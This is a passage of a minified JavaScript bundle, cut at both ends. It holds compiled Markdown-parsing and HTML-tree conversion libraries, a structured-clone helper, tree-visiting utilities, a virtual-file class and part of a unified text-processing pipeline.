O=this.stack[this.stack.length-1],Z=this.resume(),fe=this.stack[this.stack.length-1];if(this.data.inReference=!0,fe.type==="link"){const le=O.children;fe.children=le}else fe.alt=Z}function U(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.url=O}function H(){const O=this.resume(),Z=this.stack[this.stack.length-1];Z.title=O}function oe(){this.data.inReference=void 0}function M(){this.data.referenceType="collapsed"}function ve(O){const Z=this.resume(),fe=this.stack[this.stack.length-1];fe.label=Z,fe.identifier=On(this.sliceSerialize(O)).toLowerCase(),this.data.referenceType="full"}function je(O){this.data.characterReferenceType=O.type}function Ae(O){const Z=this.sliceSerialize(O),fe=this.data.characterReferenceType;let le;fe?(le=Tj(Z,fe==="characterReferenceMarkerNumeric"?10:16),this.data.characterReferenceType=void 0):le=xv(Z);const Se=this.stack[this.stack.length-1];Se.value+=le}function Oe(O){const Z=this.stack.pop();Z.position.end=Oi(O.end)}function sa(O){j.call(this,O);const Z=this.stack[this.stack.length-1];Z.url=this.sliceSerialize(O)}function ta(O){j.call(this,O);const Z=this.stack[this.stack.length-1];Z.url="mailto:"+this.sliceSerialize(O)}function Pe(){return{type:"blockquote",children:[]}}function Pt(){return{type:"code",lang:null,meta:null,value:""}}function Vn(){return{type:"inlineCode",value:""}}function Fn(){return{type:"definition",identifier:"",label:null,title:null,url:""}}function ht(){return{type:"emphasis",children:[]}}function an(){return{type:"heading",depth:0,children:[]}}function tn(){return{type:"break"}}function Hn(){return{type:"html",value:""}}function Ao(){return{type:"image",title:null,url:"",alt:null}}function Fe(){return{type:"link",title:null,url:"",children:[]}}function ia(O){return{type:"list",ordered:O.type==="listOrdered",start:null,spread:O._spread,children:[]}}function Ut(O){return{type:"listItem",spread:O._spread,checked:null,children:[]}}function sr(){return{type:"paragraph",children:[]}}function ii(){return{type:"strong",children:[]}}function Ua(){return{type:"text",value:""}}function nn(){return{type:"thematicBreak"}}}function Oi(a){return{line:a.line,column:a.column,offset:a.offset}}function _j(a,e){let t=-1;for(;++t<e.length;){const o=e[t];Array.isArray(o)?_j(a,o):xz(a,o)}}function xz(a,e){let t;for(t in e)if(Mj.call(e,t))switch(t){case"canContainEols":{const o=e[t];o&&a[t].push(...o);break}case"transforms":{const o=e[t];o&&a[t].push(...o);break}case"enter":case"exit":{const o=e[t];o&&Object.assign(a[t],o);break}}}function yA(a,e){throw a?new Error("Cannot close `"+a.type+"` ("+Jc({start:a.start,end:a.end})+"): a different token (`"+e.type+"`, "+Jc({start:e.start,end:e.end})+") is open"):new Error("Cannot close document, a token (`"+e.type+"`, "+Jc({start:e.start,end:e.end})+") is still open")}function jz(a){const e=this;e.parser=t;function t(o){return Az(o,{...e.data("settings"),...a,extensions:e.data("micromarkExtensions")||[],mdastExtensions:e.data("fromMarkdownExtensions")||[]})}}function Pz(a,e){const t={type:"element",tagName:"blockquote",properties:{},children:a.wrap(a.all(e),!0)};return a.patch(e,t),a.applyData(e,t)}function qz(a,e){const t={type:"element",tagName:"br",properties:{},children:[]};return a.patch(e,t),[a.applyData(e,t),{type:"text",value:`
`}]}function Rz(a,e){const t=e.value?e.value+`
`:"",o={},r=e.lang?e.lang.split(/\s+/):[];r.length>0&&(o.className=["language-"+r[0]]);let l={type:"element",tagName:"code",properties:o,children:[{type:"text",value:t}]};return e.meta&&(l.data={meta:e.meta}),a.patch(e,l),l=a.applyData(e,l),l={type:"element",tagName:"pre",properties:{},children:[l]},a.patch(e,l),l}function Lz(a,e){const t={type:"element",tagName:"del",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function Iz(a,e){const t={type:"element",tagName:"em",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function Dz(a,e){const t=typeof a.options.clobberPrefix=="string"?a.options.clobberPrefix:"user-content-",o=String(e.identifier).toUpperCase(),r=Sl(o.toLowerCase()),l=a.footnoteOrder.indexOf(o);let c,d=a.footnoteCounts.get(o);d===void 0?(d=0,a.footnoteOrder.push(o),c=a.footnoteOrder.length):c=l+1,d+=1,a.footnoteCounts.set(o,d);const f={type:"element",tagName:"a",properties:{href:"#"+t+"fn-"+r,id:t+"fnref-"+r+(d>1?"-"+d:""),dataFootnoteRef:!0,ariaDescribedBy:["footnote-label"]},children:[{type:"text",value:String(c)}]};a.patch(e,f);const p={type:"element",tagName:"sup",properties:{},children:[f]};return a.patch(e,p),a.applyData(e,p)}function wz(a,e){const t={type:"element",tagName:"h"+e.depth,properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function Mz(a,e){if(a.options.allowDangerousHtml){const t={type:"raw",value:e.value};return a.patch(e,t),a.applyData(e,t)}}function kj(a,e){const t=e.referenceType;let o="]";if(t==="collapsed"?o+="[]":t==="full"&&(o+="["+(e.label||e.identifier)+"]"),e.type==="imageReference")return[{type:"text",value:"!["+e.alt+o}];const r=a.all(e),l=r[0];l&&l.type==="text"?l.value="["+l.value:r.unshift({type:"text",value:"["});const c=r[r.length-1];return c&&c.type==="text"?c.value+=o:r.push({type:"text",value:o}),r}function _z(a,e){const t=String(e.identifier).toUpperCase(),o=a.definitionById.get(t);if(!o)return kj(a,e);const r={src:Sl(o.url||""),alt:e.alt};o.title!==null&&o.title!==void 0&&(r.title=o.title);const l={type:"element",tagName:"img",properties:r,children:[]};return a.patch(e,l),a.applyData(e,l)}function kz(a,e){const t={src:Sl(e.url)};e.alt!==null&&e.alt!==void 0&&(t.alt=e.alt),e.title!==null&&e.title!==void 0&&(t.title=e.title);const o={type:"element",tagName:"img",properties:t,children:[]};return a.patch(e,o),a.applyData(e,o)}function Nz(a,e){const t={type:"text",value:e.value.replace(/\r?\n|\r/g," ")};a.patch(e,t);const o={type:"element",tagName:"code",properties:{},children:[t]};return a.patch(e,o),a.applyData(e,o)}function Oz(a,e){const t=String(e.identifier).toUpperCase(),o=a.definitionById.get(t);if(!o)return kj(a,e);const r={href:Sl(o.url||"")};o.title!==null&&o.title!==void 0&&(r.title=o.title);const l={type:"element",tagName:"a",properties:r,children:a.all(e)};return a.patch(e,l),a.applyData(e,l)}function zz(a,e){const t={href:Sl(e.url)};e.title!==null&&e.title!==void 0&&(t.title=e.title);const o={type:"element",tagName:"a",properties:t,children:a.all(e)};return a.patch(e,o),a.applyData(e,o)}function Uz(a,e,t){const o=a.all(e),r=t?Bz(t):Nj(e),l={},c=[];if(typeof e.checked=="boolean"){const v=o[0];let y;v&&v.type==="element"&&v.tagName==="p"?y=v:(y={type:"element",tagName:"p",properties:{},children:[]},o.unshift(y)),y.children.length>0&&y.children.unshift({type:"text",value:" "}),y.children.unshift({type:"element",tagName:"input",properties:{type:"checkbox",checked:e.checked,disabled:!0},children:[]}),l.className=["task-list-item"]}let d=-1;for(;++d<o.length;){const v=o[d];(r||d!==0||v.type!=="element"||v.tagName!=="p")&&c.push({type:"text",value:`
`}),v.type==="element"&&v.tagName==="p"&&!r?c.push(...v.children):c.push(v)}const f=o[o.length-1];f&&(r||f.type!=="element"||f.tagName!=="p")&&c.push({type:"text",value:`
`});const p={type:"element",tagName:"li",properties:l,children:c};return a.patch(e,p),a.applyData(e,p)}function Bz(a){let e=!1;if(a.type==="list"){e=a.spread||!1;const t=a.children;let o=-1;for(;!e&&++o<t.length;)e=Nj(t[o])}return e}function Nj(a){const e=a.spread;return e??a.children.length>1}function Vz(a,e){const t={},o=a.all(e);let r=-1;for(typeof e.start=="number"&&e.start!==1&&(t.start=e.start);++r<o.length;){const c=o[r];if(c.type==="element"&&c.tagName==="li"&&c.properties&&Array.isArray(c.properties.className)&&c.properties.className.includes("task-list-item")){t.className=["contains-task-list"];break}}const l={type:"element",tagName:e.ordered?"ol":"ul",properties:t,children:a.wrap(o,!0)};return a.patch(e,l),a.applyData(e,l)}function Fz(a,e){const t={type:"element",tagName:"p",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function Hz(a,e){const t={type:"root",children:a.wrap(a.all(e))};return a.patch(e,t),a.applyData(e,t)}function Gz(a,e){const t={type:"element",tagName:"strong",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}function Jz(a,e){const t=a.all(e),o=t.shift(),r=[];if(o){const c={type:"element",tagName:"thead",properties:{},children:a.wrap([o],!0)};a.patch(e.children[0],c),r.push(c)}if(t.length>0){const c={type:"element",tagName:"tbody",properties:{},children:a.wrap(t,!0)},d=Ev(e.children[1]),f=gj(e.children[e.children.length-1]);d&&f&&(c.position={start:d,end:f}),r.push(c)}const l={type:"element",tagName:"table",properties:{},children:a.wrap(r,!0)};return a.patch(e,l),a.applyData(e,l)}function Qz(a,e,t){const o=t?t.children:void 0,l=(o?o.indexOf(e):1)===0?"th":"td",c=t&&t.type==="table"?t.align:void 0,d=c?c.length:e.children.length;let f=-1;const p=[];for(;++f<d;){const y=e.children[f],S={},A=c?c[f]:void 0;A&&(S.align=A);let R={type:"element",tagName:l,properties:S,children:[]};y&&(R.children=a.all(y),a.patch(y,R),R=a.applyData(y,R)),p.push(R)}const v={type:"element",tagName:"tr",properties:{},children:a.wrap(p,!0)};return a.patch(e,v),a.applyData(e,v)}function Wz(a,e){const t={type:"element",tagName:"td",properties:{},children:a.all(e)};return a.patch(e,t),a.applyData(e,t)}const EA=9,SA=32;function Kz(a){const e=String(a),t=/\r?\n|\r/g;let o=t.exec(e),r=0;const l=[];for(;o;)l.push(CA(e.slice(r,o.index),r>0,!0),o[0]),r=o.index+o[0].length,o=t.exec(e);return l.push(CA(e.slice(r),r>0,!1)),l.join("")}function CA(a,e,t){let o=0,r=a.length;if(e){let l=a.codePointAt(o);for(;l===EA||l===SA;)o++,l=a.codePointAt(o)}if(t){let l=a.codePointAt(r-1);for(;l===EA||l===SA;)r--,l=a.codePointAt(r-1)}return r>o?a.slice(o,r):""}function $z(a,e){const t={type:"text",value:Kz(String(e.value))};return a.patch(e,t),a.applyData(e,t)}function Yz(a,e){const t={type:"element",tagName:"hr",properties:{},children:[]};return a.patch(e,t),a.applyData(e,t)}const Xz={blockquote:Pz,break:qz,code:Rz,delete:Lz,emphasis:Iz,footnoteReference:Dz,heading:wz,html:Mz,imageReference:_z,image:kz,inlineCode:Nz,linkReference:Oz,link:zz,listItem:Uz,list:Vz,paragraph:Fz,root:Hz,strong:Gz,table:Jz,tableCell:Wz,tableRow:Qz,text:$z,thematicBreak:Yz,toml:op,yaml:op,definition:op,footnoteDefinition:op};function op(){}const Oj=-1,Sm=0,Wc=1,$p=2,Pv=3,qv=4,Rv=5,Lv=6,zj=7,Uj=8,AA=typeof self=="object"?self:globalThis,Zz=(a,e)=>{const t=(r,l)=>(a.set(l,r),r),o=r=>{if(a.has(r))return a.get(r);const[l,c]=e[r];switch(l){case Sm:case Oj:return t(c,r);case Wc:{const d=t([],r);for(const f of c)d.push(o(f));return d}case $p:{const d=t({},r);for(const[f,p]of c)d[o(f)]=o(p);return d}case Pv:return t(new Date(c),r);case qv:{const{source:d,flags:f}=c;return t(new RegExp(d,f),r)}case Rv:{const d=t(new Map,r);for(const[f,p]of c)d.set(o(f),o(p));return d}case Lv:{const d=t(new Set,r);for(const f of c)d.add(o(f));return d}case zj:{const{name:d,message:f}=c;return t(new AA[d](f),r)}case Uj:return t(BigInt(c),r);case"BigInt":return t(Object(BigInt(c)),r);case"ArrayBuffer":return t(new Uint8Array(c).buffer,c);case"DataView":{const{buffer:d}=new Uint8Array(c);return t(new DataView(d),c)}}return t(new AA[l](c),r)};return o},TA=a=>Zz(new Map,a)(0),Fs="",{toString:eU}={},{keys:aU}=Object,Ic=a=>{const e=typeof a;if(e!=="object"||!a)return[Sm,e];const t=eU.call(a).slice(8,-1);switch(t){case"Array":return[Wc,Fs];case"Object":return[$p,Fs];case"Date":return[Pv,Fs];case"RegExp":return[qv,Fs];case"Map":return[Rv,Fs];case"Set":return[Lv,Fs];case"DataView":return[Wc,t]}return t.includes("Array")?[Wc,t]:t.includes("Error")?[zj,t]:[$p,t]},ip=([a,e])=>a===Sm&&(e==="function"||e==="symbol"),tU=(a,e,t,o)=>{const r=(c,d)=>{const f=o.push(c)-1;return t.set(d,f),f},l=c=>{if(t.has(c))return t.get(c);let[d,f]=Ic(c);switch(d){case Sm:{let v=c;switch(f){case"bigint":d=Uj,v=c.toString();break;case"function":case"symbol":if(a)throw new TypeError("unable to serialize "+f);v=null;break;case"undefined":return r([Oj],c)}return r([d,v],c)}case Wc:{if(f){let S=c;return f==="DataView"?S=new Uint8Array(c.buffer):f==="ArrayBuffer"&&(S=new Uint8Array(c)),r([f,[...S]],c)}const v=[],y=r([d,v],c);for(const S of c)v.push(l(S));return y}case $p:{if(f)switch(f){case"BigInt":return r([f,c.toString()],c);case"Boolean":case"Number":case"String":return r([f,c.valueOf()],c)}if(e&&"toJSON"in c)return l(c.toJSON());const v=[],y=r([d,v],c);for(const S of aU(c))(a||!ip(Ic(c[S])))&&v.push([l(S),l(c[S])]);return y}case Pv:return r([d,c.toISOString()],c);case qv:{const{source:v,flags:y}=c;return r([d,{source:v,flags:y}],c)}case Rv:{const v=[],y=r([d,v],c);for(const[S,A]of c)(a||!(ip(Ic(S))||ip(Ic(A))))&&v.push([l(S),l(A)]);return y}case Lv:{const v=[],y=r([d,v],c);for(const S of c)(a||!ip(Ic(S)))&&v.push(l(S));return y}}const{message:p}=c;return r([d,{name:f,message:p}],c)};return l},xA=(a,{json:e,lossy:t}={})=>{const o=[];return tU(!(e||t),!!e,new Map,o)(a),o},Yp=typeof structuredClone=="function"?(a,e)=>e&&("json"in e||"lossy"in e)?TA(xA(a,e)):structuredClone(a):(a,e)=>TA(xA(a,e));function nU(a,e){const t=[{type:"text",value:""}];return e>1&&t.push({type:"element",tagName:"sup",properties:{},children:[{type:"text",value:String(e)}]}),t}function oU(a,e){return"Back to reference "+(a+1)+(e>1?"-"+e:"")}function iU(a){const e=typeof a.options.clobberPrefix=="string"?a.options.clobberPrefix:"user-content-",t=a.options.footnoteBackContent||nU,o=a.options.footnoteBackLabel||oU,r=a.options.footnoteLabel||"Footnotes",l=a.options.footnoteLabelTagName||"h2",c=a.options.footnoteLabelProperties||{className:["sr-only"]},d=[];let f=-1;for(;++f<a.footnoteOrder.length;){const p=a.footnoteById.get(a.footnoteOrder[f]);if(!p)continue;const v=a.all(p),y=String(p.identifier).toUpperCase(),S=Sl(y.toLowerCase());let A=0;const R=[],L=a.footnoteCounts.get(y);for(;L!==void 0&&++A<=L;){R.length>0&&R.push({type:"text",value:" "});let G=typeof t=="string"?t:t(f,A);typeof G=="string"&&(G={type:"text",value:G}),R.push({type:"element",tagName:"a",properties:{href:"#"+e+"fnref-"+S+(A>1?"-"+A:""),dataFootnoteBackref:"",ariaLabel:typeof o=="string"?o:o(f,A),className:["data-footnote-backref"]},children:Array.isArray(G)?G:[G]})}const x=v[v.length-1];if(x&&x.type==="element"&&x.tagName==="p"){const G=x.children[x.children.length-1];G&&G.type==="text"?G.value+=" ":x.children.push({type:"text",value:" "}),x.children.push(...R)}else v.push(...R);const D={type:"element",tagName:"li",properties:{id:e+"fn-"+S},children:a.wrap(v,!0)};a.patch(p,D),d.push(D)}if(d.length!==0)return{type:"element",tagName:"section",properties:{dataFootnotes:!0,className:["footnotes"]},children:[{type:"element",tagName:l,properties:{...Yp(c),id:"footnote-label"},children:[{type:"text",value:r}]},{type:"text",value:`
`},{type:"element",tagName:"ol",properties:{},children:a.wrap(d,!0)},{type:"text",value:`
`}]}}const Cm=(function(a){if(a==null)return cU;if(typeof a=="function")return Am(a);if(typeof a=="object")return Array.isArray(a)?rU(a):sU(a);if(typeof a=="string")return lU(a);throw new Error("Expected function, string, or object as test")});function rU(a){const e=[];let t=-1;for(;++t<a.length;)e[t]=Cm(a[t]);return Am(o);function o(...r){let l=-1;for(;++l<e.length;)if(e[l].apply(this,r))return!0;return!1}}function sU(a){const e=a;return Am(t);function t(o){const r=o;let l;for(l in a)if(r[l]!==e[l])return!1;return!0}}function lU(a){return Am(e);function e(t){return t&&t.type===a}}function Am(a){return e;function e(t,o,r){return!!(uU(t)&&a.call(this,t,typeof o=="number"?o:void 0,r||void 0))}}function cU(){return!0}function uU(a){return a!==null&&typeof a=="object"&&"type"in a}const Bj=[],dU=!0,Wg=!1,pU="skip";function Vj(a,e,t,o){let r;typeof e=="function"&&typeof t!="function"?(o=t,t=e):r=e;const l=Cm(r),c=o?-1:1;d(a,void 0,[])();function d(f,p,v){const y=f&&typeof f=="object"?f:{};if(typeof y.type=="string"){const A=typeof y.tagName=="string"?y.tagName:typeof y.name=="string"?y.name:void 0;Object.defineProperty(S,"name",{value:"node ("+(f.type+(A?"<"+A+">":""))+")"})}return S;function S(){let A=Bj,R,L,x;if((!e||l(f,p,v[v.length-1]||void 0))&&(A=mU(t(f,v)),A[0]===Wg))return A;if("children"in f&&f.children){const D=f;if(D.children&&A[0]!==pU)for(L=(o?D.children.length:-1)+c,x=v.concat(D);L>-1&&L<D.children.length;){const G=D.children[L];if(R=d(G,L,x)(),R[0]===Wg)return R;L=typeof R[1]=="number"?R[1]:L+c}}return A}}}function mU(a){return Array.isArray(a)?a:typeof a=="number"?[dU,a]:a==null?Bj:[a]}function Iv(a,e,t,o){let r,l,c;typeof e=="function"&&typeof t!="function"?(l=void 0,c=e,r=t):(l=e,c=t,r=o),Vj(a,l,d,r);function d(f,p){const v=p[p.length-1],y=v?v.children.indexOf(f):void 0;return c(f,y,v)}}const Kg={}.hasOwnProperty,fU={};function hU(a,e){const t=e||fU,o=new Map,r=new Map,l=new Map,c={...Xz,...t.handlers},d={all:p,applyData:bU,definitionById:o,footnoteById:r,footnoteCounts:l,footnoteOrder:[],handlers:c,one:f,options:t,patch:gU,wrap:yU};return Iv(a,function(v){if(v.type==="definition"||v.type==="footnoteDefinition"){const y=v.type==="definition"?o:r,S=String(v.identifier).toUpperCase();y.has(S)||y.set(S,v)}}),d;function f(v,y){const S=v.type,A=d.handlers[S];if(Kg.call(d.handlers,S)&&A)return A(d,v,y);if(d.options.passThrough&&d.options.passThrough.includes(S)){if("children"in v){const{children:L,...x}=v,D=Yp(x);return D.children=d.all(v),D}return Yp(v)}return(d.options.unknownHandler||vU)(d,v,y)}function p(v){const y=[];if("children"in v){const S=v.children;let A=-1;for(;++A<S.length;){const R=d.one(S[A],v);if(R){if(A&&S[A-1].type==="break"&&(!Array.isArray(R)&&R.type==="text"&&(R.value=jA(R.value)),!Array.isArray(R)&&R.type==="element")){const L=R.children[0];L&&L.type==="text"&&(L.value=jA(L.value))}Array.isArray(R)?y.push(...R):y.push(R)}}}return y}}function gU(a,e){a.position&&(e.position=oO(a))}function bU(a,e){let t=e;if(a&&a.data){const o=a.data.hName,r=a.data.hChildren,l=a.data.hProperties;if(typeof o=="string")if(t.type==="element")t.tagName=o;else{const c="children"in t?t.children:[t];t={type:"element",tagName:o,properties:{},children:c}}t.type==="element"&&l&&Object.assign(t.properties,Yp(l)),"children"in t&&t.children&&r!==null&&r!==void 0&&(t.children=r)}return t}function vU(a,e){const t=e.data||{},o="value"in e&&!(Kg.call(t,"hProperties")||Kg.call(t,"hChildren"))?{type:"text",value:e.value}:{type:"element",tagName:"div",properties:{},children:a.all(e)};return a.patch(e,o),a.applyData(e,o)}function yU(a,e){const t=[];let o=-1;for(e&&t.push({type:"text",value:`
`});++o<a.length;)o&&t.push({type:"text",value:`
`}),t.push(a[o]);return e&&a.length>0&&t.push({type:"text",value:`
`}),t}function jA(a){let e=0,t=a.charCodeAt(e);for(;t===9||t===32;)e++,t=a.charCodeAt(e);return a.slice(e)}function PA(a,e){const t=hU(a,e),o=t.one(a,void 0),r=iU(t),l=Array.isArray(o)?{type:"root",children:o}:o||{type:"root",children:[]};return r&&l.children.push({type:"text",value:`
`},r),l}function EU(a,e){return a&&"run"in a?async function(t,o){const r=PA(t,{file:o,...e});await a.run(r,o)}:function(t,o){return PA(t,{file:o,...a||e})}}function qA(a){if(a)throw a}var Xh,RA;function SU(){if(RA)return Xh;RA=1;var a=Object.prototype.hasOwnProperty,e=Object.prototype.toString,t=Object.defineProperty,o=Object.getOwnPropertyDescriptor,r=function(p){return typeof Array.isArray=="function"?Array.isArray(p):e.call(p)==="[object Array]"},l=function(p){if(!p||e.call(p)!=="[object Object]")return!1;var v=a.call(p,"constructor"),y=p.constructor&&p.constructor.prototype&&a.call(p.constructor.prototype,"isPrototypeOf");if(p.constructor&&!v&&!y)return!1;var S;for(S in p);return typeof S>"u"||a.call(p,S)},c=function(p,v){t&&v.name==="__proto__"?t(p,v.name,{enumerable:!0,configurable:!0,value:v.newValue,writable:!0}):p[v.name]=v.newValue},d=function(p,v){if(v==="__proto__")if(a.call(p,v)){if(o)return o(p,v).value}else return;return p[v]};return Xh=function f(){var p,v,y,S,A,R,L=arguments[0],x=1,D=arguments.length,G=!1;for(typeof L=="boolean"&&(G=L,L=arguments[1]||{},x=2),(L==null||typeof L!="object"&&typeof L!="function")&&(L={});x<D;++x)if(p=arguments[x],p!=null)for(v in p)y=d(L,v),S=d(p,v),L!==S&&(G&&S&&(l(S)||(A=r(S)))?(A?(A=!1,R=y&&r(y)?y:[]):R=y&&l(y)?y:{},c(L,{name:v,newValue:f(G,R,S)})):typeof S<"u"&&c(L,{name:v,newValue:S}));return L},Xh}var CU=SU();const Zh=Zg(CU);function $g(a){if(typeof a!="object"||a===null)return!1;const e=Object.getPrototypeOf(a);return(e===null||e===Object.prototype||Object.getPrototypeOf(e)===null)&&!(Symbol.toStringTag in a)&&!(Symbol.iterator in a)}function AU(){const a=[],e={run:t,use:o};return e;function t(...r){let l=-1;const c=r.pop();if(typeof c!="function")throw new TypeError("Expected function as last argument, not "+c);d(null,...r);function d(f,...p){const v=a[++l];let y=-1;if(f){c(f);return}for(;++y<r.length;)(p[y]===null||p[y]===void 0)&&(p[y]=r[y]);r=p,v?TU(v,d)(...p):c(null,...p)}}function o(r){if(typeof r!="function")throw new TypeError("Expected `middelware` to be a function, not "+r);return a.push(r),e}}function TU(a,e){let t;return o;function o(...c){const d=a.length>c.length;let f;d&&c.push(r);try{f=a.apply(this,c)}catch(p){const v=p;if(d&&t)throw v;return r(v)}d||(f&&f.then&&typeof f.then=="function"?f.then(l,r):f instanceof Error?r(f):l(f))}function r(c,...d){t||(t=!0,e(c,...d))}function l(c){r(null,c)}}const fo={basename:xU,dirname:jU,extname:PU,join:qU,sep:"/"};function xU(a,e){if(e!==void 0&&typeof e!="string")throw new TypeError('"ext" argument must be a string');Tu(a);let t=0,o=-1,r=a.length,l;if(e===void 0||e.length===0||e.length>a.length){for(;r--;)if(a.codePointAt(r)===47){if(l){t=r+1;break}}else o<0&&(l=!0,o=r+1);return o<0?"":a.slice(t,o)}if(e===a)return"";let c=-1,d=e.length-1;for(;r--;)if(a.codePointAt(r)===47){if(l){t=r+1;break}}else c<0&&(l=!0,c=r+1),d>-1&&(a.codePointAt(r)===e.codePointAt(d--)?d<0&&(o=r):(d=-1,o=c));return t===o?o=c:o<0&&(o=a.length),a.slice(t,o)}function jU(a){if(Tu(a),a.length===0)return".";let e=-1,t=a.length,o;for(;--t;)if(a.codePointAt(t)===47){if(o){e=t;break}}else o||(o=!0);return e<0?a.codePointAt(0)===47?"/":".":e===1&&a.codePointAt(0)===47?"//":a.slice(0,e)}function PU(a){Tu(a);let e=a.length,t=-1,o=0,r=-1,l=0,c;for(;e--;){const d=a.codePointAt(e);if(d===47){if(c){o=e+1;break}continue}t<0&&(c=!0,t=e+1),d===46?r<0?r=e:l!==1&&(l=1):r>-1&&(l=-1)}return r<0||t<0||l===0||l===1&&r===t-1&&r===o+1?"":a.slice(r,t)}function qU(...a){let e=-1,t;for(;++e<a.length;)Tu(a[e]),a[e]&&(t=t===void 0?a[e]:t+"/"+a[e]);return t===void 0?".":RU(t)}function RU(a){Tu(a);const e=a.codePointAt(0)===47;let t=LU(a,!e);return t.length===0&&!e&&(t="."),t.length>0&&a.codePointAt(a.length-1)===47&&(t+="/"),e?"/"+t:t}function LU(a,e){let t="",o=0,r=-1,l=0,c=-1,d,f;for(;++c<=a.length;){if(c<a.length)d=a.codePointAt(c);else{if(d===47)break;d=47}if(d===47){if(!(r===c-1||l===1))if(r!==c-1&&l===2){if(t.length<2||o!==2||t.codePointAt(t.length-1)!==46||t.codePointAt(t.length-2)!==46){if(t.length>2){if(f=t.lastIndexOf("/"),f!==t.length-1){f<0?(t="",o=0):(t=t.slice(0,f),o=t.length-1-t.lastIndexOf("/")),r=c,l=0;continue}}else if(t.length>0){t="",o=0,r=c,l=0;continue}}e&&(t=t.length>0?t+"/..":"..",o=2)}else t.length>0?t+="/"+a.slice(r+1,c):t=a.slice(r+1,c),o=c-r-1;r=c,l=0}else d===46&&l>-1?l++:l=-1}return t}function Tu(a){if(typeof a!="string")throw new TypeError("Path must be a string. Received "+JSON.stringify(a))}const IU={cwd:DU};function DU(){return"/"}function Yg(a){return!!(a!==null&&typeof a=="object"&&"href"in a&&a.href&&"protocol"in a&&a.protocol&&a.auth===void 0)}function wU(a){if(typeof a=="string")a=new URL(a);else if(!Yg(a)){const e=new TypeError('The "path" argument must be of type string or an instance of URL. Received `'+a+"`");throw e.code="ERR_INVALID_ARG_TYPE",e}if(a.protocol!=="file:"){const e=new TypeError("The URL must be of scheme file");throw e.code="ERR_INVALID_URL_SCHEME",e}return MU(a)}function MU(a){if(a.hostname!==""){const o=new TypeError('File URL host must be "localhost" or empty on darwin');throw o.code="ERR_INVALID_FILE_URL_HOST",o}const e=a.pathname;let t=-1;for(;++t<e.length;)if(e.codePointAt(t)===37&&e.codePointAt(t+1)===50){const o=e.codePointAt(t+2);if(o===70||o===102){const r=new TypeError("File URL path must not include encoded / characters");throw r.code="ERR_INVALID_FILE_URL_PATH",r}}return decodeURIComponent(e)}const eg=["history","path","basename","stem","extname","dirname"];class Fj{constructor(e){let t;e?Yg(e)?t={path:e}:typeof e=="string"||_U(e)?t={value:e}:t=e:t={},this.cwd="cwd"in t?"":IU.cwd(),this.data={},this.history=[],this.messages=[],this.value,this.map,this.result,this.stored;let o=-1;for(;++o<eg.length;){const l=eg[o];l in t&&t[l]!==void 0&&t[l]!==null&&(this[l]=l==="history"?[...t[l]]:t[l])}let r;for(r in t)eg.includes(r)||(this[r]=t[r])}get basename(){return typeof this.path=="string"?fo.basename(this.path):void 0}set basename(e){tg(e,"basename"),ag(e,"basename"),this.path=fo.join(this.dirname||"",e)}get dirname(){return typeof this.path=="string"?fo.dirname(this.path):void 0}set dirname(e){LA(this.basename,"dirname"),this.path=fo.join(e||"",this.basename)}get extname(){return typeof this.path=="string"?fo.extname(this.path):void 0}set extname(e){if(ag(e,"extname"),LA(this.dirname,"extname"),e){if(e.codePointAt(0)!==46)throw new Error("`extname` must start with `.`");if(e.includes(".",1))throw new Error("`extname` cannot contain multiple dots")}this.path=fo.join(this.dirname,this.stem+(e||""))}get path(){return this.history[this.history.length-1]}set path(e){Yg(e)&&(e=wU(e)),tg(e,"path"),this.path!==e&&this.history.push(e)}get stem(){return typeof this.path=="string"?fo.basename(this.path,this.extname):void 0}set stem(e){tg(e,"stem"),ag(e,"stem"),this.path=fo.join(this.dirname||"",e+(this.extname||""))}fail(e,t,o){const r=this.message(e,t,o);throw r.fatal=!0,r}info(e,t,o){const r=this.message(e,t,o);return r.fatal=void 0,r}message(e,t,o){const r=new At(e,t,o);return this.path&&(r.name=this.path+":"+r.name,r.file=this.path),r.fatal=!1,this.messages.push(r),r}toString(e){return this.value===void 0?"":typeof this.value=="string"?this.value:new TextDecoder(e||void 0).decode(this.value)}}function ag(a,e){if(a&&a.includes(fo.sep))throw new Error("`"+e+"` cannot be a path: did not expect `"+fo.sep+"`")}function tg(a,e){if(!a)throw new Error("`"+e+"` cannot be empty")}function LA(a,e){if(!a)throw new Error("Setting `"+e+"` requires `path` to be set too")}function _U(a){return!!(a&&typeof a=="object"&&"byteLength"in a&&"byteOffset"in a)}const kU=(function(a){const o=this.constructor.prototype,r=o[a],l=function(){return r.apply(l,arguments)};return Object.setPrototypeOf(l,o),l}),NU={}.hasOwnProperty;class Dv extends kU{constructor(){super("copy"),this.Compiler=void 0,this.Parser=void 0,this.attachers=[],this.compiler=void 0,this.freezeIndex=-1,this.frozen=void 0,this.namespace={},this.parser=void 0,this.transformers=AU()}copy(){const e=new Dv;let t=-1;for(;++t<this.attachers.length;){const o=this.attachers[t];e.use(...o)}return e.data(Zh(!0,{},this.namespace)),e}data(e,t){return typeof e=="string"?arguments.length===2?(ig("data",this.frozen),this.namespace[e]=t,this):NU.call(this.namespace,e)&&this.namespace[e]||void 0:e?(ig("data",this.frozen),this.namespace=e,this):this.namespace}freeze(){if(this.frozen)return this;const e=this;for(;++this.freezeIndex<this.attachers.length;){const[t,...o]=this.attachers[this.freezeIndex];if(o[0]===!1)continue;o[0]===!0&&(o[0]=void 0);const r=t.call(e,...o);typeof r=="function"&&this.transformers.use(r)}return this.frozen=!0,this.freezeIndex=Number.POSITIVE_INFINITY,this}parse(e){this.freeze();const t=rp(e),o=this.parser||this.Parser;return ng("parse",o),o(String(t),t)}process(e,t){const o=this;return this.freeze(),ng("process",this.parser||this.Parser),og("process",this.compiler||this.Compiler),t?r(void 0,t):new Promise(r);function r(l,c){const d=rp(e),f=o.parse(d);o.run(f,d,function(v,y,S){if(v||!y||!S)return p(v);const A=y,R=o.stringify(A,S);UU(R)?S.value=R:S.result=R,p(v,S)});function p(v,y){v||!y?c(v):l?l(y):t(void 0,y)}}}processSync(e){let t=!1,o;return this.freeze(),ng("processSync",this.parser||this.Parser),og("processSync",this.compiler||this.Compiler),this.process(e,r),DA("processSync","process",t),o;function r(l,c){t=!0,qA(l),o=c}}run(e,t,o){IA(e),this.freeze();const r=this.transformers;return!o&&typeof t=="function"&&(o=t,t=void 0),o?l(void 0,o):new 